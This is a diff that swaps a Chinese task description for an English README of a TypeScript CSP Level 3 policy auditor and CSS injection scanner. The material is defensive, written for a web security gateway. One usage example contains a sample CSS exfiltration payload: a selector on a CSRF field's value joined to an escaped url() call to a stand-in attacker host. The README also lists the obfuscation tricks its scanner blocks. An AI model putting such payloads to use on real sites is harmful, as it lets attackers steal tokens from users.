@@ -1,1 +1,118 @@
-Web 应用安全网关在上线前审计响应头 Content-Security-Policy（CSP Level 3）与用户可控样式片段时，若仅检查是否包含 `script-src` 而未校验指令回退链（`default-src`）、忽略 `'strict-dynamic'` 对传统白名单与 `'unsafe-inline'` 的语义覆盖、漏查缺失 `base-uri`/`object-src` 导致的 `<base>` 相对脚本劫持，或放过属性选择器拼接 `url()` 触发的 CSS 令牌渗漏（CSS Exfiltration），攻击者无需执行 JS 即可窃取 CSRF Token 或绕过 CSP 执行任意脚本。为 TypeScript 安全宿主实现可导入的零外部依赖 CSP Level 3 策略求值与 CSS 注入安全审查组件。组件分两部分严格实现：（1）CSP Level 3 完整解析与绕过审计：按规范处理多头交集（多个 CSP 头同时生效取最严交集）与同头重复指令（仅首个生效）、`script-src-elem`/`script-src`/`default-src` 回退链、`'strict-dynamic'` 语义与 nonce/hash 匹配，自动检出可被绕过的高危配置（`unsafe-inline`/`unsafe-eval`/通配符 `*`/`data:`/`http:`、缺失 `object-src 'none'`、缺失 `base-uri 'none'/'self'`、白名单含已知 JSONP/开放重定向风险源）；（2）零依赖 CSS 词法/语法安全审计器：硬拦截 `@import`、`expression()`、`-moz-binding`、`url()` 指向外部非白名单源（含反斜杠 Unicode 转义如 `\75 rl(`、注释分割与换行混淆）、以及针对敏感属性（`[value^="..."]`/`[name*="token"]`）结合外部 `url()`/`@font-face` 的属性选择器渗漏载荷。附多 CSP 头交集、重复指令忽略、`<base>` 劫持、Unicode 转义 `url()` 渗漏对抗测试。
+# CSP Level 3 Evaluator & CSS Injection Auditor
+
+Zero-dependency, importable TypeScript components for a web-application security
+gateway. They audit response `Content-Security-Policy` headers and
+user-controlled style fragments before release, covering the bypass classes that
+a naive "does a `script-src` directive exist" check misses:
+
+- directive fallback through `default-src`;
+- `'strict-dynamic'` overriding classic host/scheme allowlists and
+  `'unsafe-inline'`;
+- missing `base-uri` / `object-src` enabling `<base>` relative-script hijacking;
+- CSS token exfiltration via attribute selectors joined to external `url()`.
+
+The package has **no runtime dependencies** and runs on any ES2022 host with a
+WebCrypto `subtle` implementation (browsers and Node 16+).
+
+## Layout
+
+| File | Responsibility |
+| --- | --- |
+| `src/csp.ts` | CSP Level 3 parser, directive fallback, intersection, nonce/hash evaluation and bypass auditing. |
+| `src/css.ts` | Zero-dependency CSS normalizer/tokenizer/parser and injection/exfiltration auditor. |
+| `src/index.ts` | Barrel export for the public API. |
+| `test/*.test.ts` | Adversarial test suites run with the built-in Node test runner. |
+
+## CSP Level 3 component (`src/csp.ts`)
+
+### Parsing & enforcement model
+
+- `parsePolicy` / `parsePolicies` parse one or more header values.
+- Duplicate directives inside one header keep only the first occurrence
+  (`DUPLICATE_DIRECTIVE`); later ones are recorded but never enforced.
+- `resolveDirective` applies CSP3 fallback chains
+  (`script-src-elem` → `script-src` → `default-src`, `object-src` →
+  `default-src`, ...). `base-uri`, `form-action` and `frame-ancestors` have no
+  fallback by spec.
+- `resolveScriptSources` implements `'strict-dynamic'`: host, scheme and
+  wildcard sources are always ignored while it is present; `'unsafe-inline'` is
+  additionally ignored once a nonce/hash trusted root exists. Nonces, hashes and
+  `'unsafe-eval'` remain effective.
+- `intersectPolicies` builds the strictest intersection: browsers enforce every
+  CSP header simultaneously (logical AND), so a source is effective only when
+  every policy contains it and a directive missing from any policy is dropped.
+
+### Bypass findings
+
+`auditCsp(headers, options?)` returns `{ policies, findings, merged }`. Finding
+codes include `UNSAFE_INLINE`, `UNSAFE_EVAL`, `WILDCARD_SCRIPT`,
+`BROAD_SCHEME_SCRIPT`, `DATA_SCRIPT`, `JSONP_OR_REDIRECT_SOURCE`,
+`MISSING_OBJECT_SRC`, `OBJECT_SRC_UNSAFE`, `MISSING_BASE_URI`,
+`BASE_URI_UNSAFE`, `STRICT_DYNAMIC_WITHOUT_NONCE_OR_HASH` and
+`MISSING_DEFAULT_OR_SCRIPT_SRC`. Known JSONP / open-redirect hosts live in
+`KNOWN_RISKY_HOSTS` and can be extended with `extraRiskyHosts`.
+
+### Runtime evaluation
+
+- `evaluateInlineScript(policies, sourceText, nonce?)` checks nonces then
+  `sha256` / `sha384` / `sha512` hashes across every enforced policy (async,
+  WebCrypto).
+- `evaluateExternalScript(policies, url)` /
+  `evaluateExternalScriptForPolicy(policy, url)` evaluate host/scheme/`*`/
+  `'self'` sources and honor the `'strict-dynamic'` allowlist override.
+
+```ts
+import { auditCsp, evaluateInlineScript } from './src/index.ts';
+
+const result = auditCsp([
+  "script-src 'nonce-a' 'strict-dynamic'; object-src 'none'; base-uri 'none'",
+  "script-src 'unsafe-inline'; object-src 'none'; base-uri 'none'",
+]);
+result.findings; // flags UNSAFE_INLINE on the weak second header
+```
+
+## CSS auditor (`src/css.ts`)
+
+`auditCss(css, options?)` runs two complementary layers and returns
+`{ allowed, findings, normalized }`.
+
+1. **Obfuscation-resistant normalized scan** — `normalizeCss` strips comments,
+   removes backslash-newline line continuations and decodes CSS escape
+   sequences (`\75 rl(`, `\000075rl(`, comment-split and newline-split
+   payloads), keeping an offset map back to the original source. This layer
+   hard-blocks `@import`, `expression()`, `-moz-binding`, executable schemes
+   (`javascript:`/`vbscript:`), and external `url()` hosts outside
+   `allowedHosts` (`EXTERNAL_URL`, `DANGEROUS_SCHEME`, `DATA_URL_BLOCKED`).
+2. **Structural tokenizer/parser analysis** — a hand-written CSS Syntax 3 style
+   tokenizer plus recursive-descent parser recovers selectors, declarations and
+   nested at-rules. It correlates sensitive attribute selectors
+   (`[value^=...]`, `[name*=token]`, ...) with external `url()` or
+   `@font-face` loads, emitting `ATTRIBUTE_EXFIL` / `FONT_FACE_EXFIL`.
+
+Relative and root-relative URLs are treated as same-origin and allowed;
+`data:`/`blob:`/`about:` are non-network schemes (`data:` can be blocked with
+`blockDataUrls: true`). Host allowlist entries match the apex or, when prefixed
+with `.`, the domain and any sub-domain.
+
+```ts
+import { auditCss } from './src/index.ts';
+
+const verdict = auditCss(
+  'input[name*="csrf"][value^="a"] { background: \\75 rl("https://evil.test/x"); }',
+  { allowedHosts: ['cdn.example.com'] },
+);
+verdict.allowed; // false
+verdict.findings.map((f) => f.code); // ['EXTERNAL_URL', 'ATTRIBUTE_EXFIL']
+```
+
+## Tests
+
+```sh
+npm test
+```
+
+The suites use the built-in Node test runner with native TypeScript type
+stripping (no install step). They include the requested adversarial cases:
+multi-header intersection, duplicate-directive ignoring, `<base>` hijack
+exposure, `'strict-dynamic'` semantics, and Unicode-escaped / comment-split
+CSS `url()` exfiltration.
